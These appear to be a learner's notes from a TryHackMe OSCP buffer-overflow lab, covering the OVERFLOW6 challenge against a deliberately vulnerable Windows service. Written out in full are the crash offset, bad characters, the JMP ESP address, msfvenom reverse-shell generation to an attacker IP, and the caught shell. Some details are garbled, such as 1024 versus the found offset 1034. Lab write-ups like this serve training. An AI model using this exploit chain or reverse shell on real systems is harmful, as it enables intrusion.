OVERFLOW6 

1. Crashed on 1200

Let's genrate the offset..
Note as soon as program crashed make sure to restart the program form (by clicking)
immunity debug => debug>restart


2. When program crash Note the valu of crah byte in our case 500

3. Now we have the crash byte but we need exact cash point where program crashed
   To do that we have to create a hex pattern with msf which is located in kali
      /usr/bin/msf-pattern_create -l 1200

  which is => ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9")



4. after sending the payload when program crashed we've to find out EIP Value
 
       which is => EIP 35694234

5. Now we need to get offset value which is exact value where program crashed...
      /usr/bin/msf-pattern_offset -l 1200 -q 35694234

    and yes we've exact crash point.. 
    
    # /usr/bin/msf-pattern_offset -l 1200 -q 35694234
       [*] Exact match at offset 1034

6. Now let's veryfy it.by sending the (1024 * A) time and (B*4)
    after sending if eip is equal to 42424242 that mean we're able to control the eip.  

    yes we've verified that eip is = 42424242

7. Then find the bad char to do that we have to use mona to create working directry first then we have to define a array with help of mona again !mona -bytearry '\x00'

 let's set the working directory....to proceed for finding the badchar...
  
  !mona config -set workingfolder c:\logs\%p
    
    then : !mona bytearray -b '\x00'

You can find the list off all the hex genrated by !mona on working dire...

just press Start+r 

and type (where oscp is my program name bytearray.txt is hex list)
c:\logs\oscp\bytearray.txt  (this will pop notepad copy that code)

 which is => ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


8.  comparing the bad char...

  	!mona compare -f C:\logs\oscp\bytearray.bin -a 0197FA30
 

 00 08 2c ad af


 	!mona bytearray -b '\x00\x08\x2c\xad\xaf'
  

  finally we've seen the popup with unmodified value..

  	!mona compare -f C:\logs\oscp\bytearray.bin -a 0195FA30


but in tryhack me it take only  '\x00\x08\x2c\xad' to verify...

9. since we've the badchar now we've to find vulnrable module and jump esp...

        !mona jmp -r esp -cpb "\x00\x08\x2c\xad\xaf"

    which will retun the address: 625011BB

    write down it in little endian form...

  		'\xBB\x11\x50\x62' ('This address will be used as eip address')

    and genrate the shell code: 
      
      msfvenom -p windows/shell_reverse_tcp LHOST=10.8.5.14 LPORT=1234 -b '\x00\x08\x2c\xad\xaf' -f c
  

10. Send your payload as : 
       s.send('OVERFLOW6 ' + buffer + jumpesp + nops + shellcode +'\r\n')
    
    Start listener...

    # nc -nlvp 1234                                                       
Listening on 0.0.0.0 1234
Connection received on 10.10.155.226 49275
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin

C:\Users\admin\Desktop\vulnerable-apps\oscp>

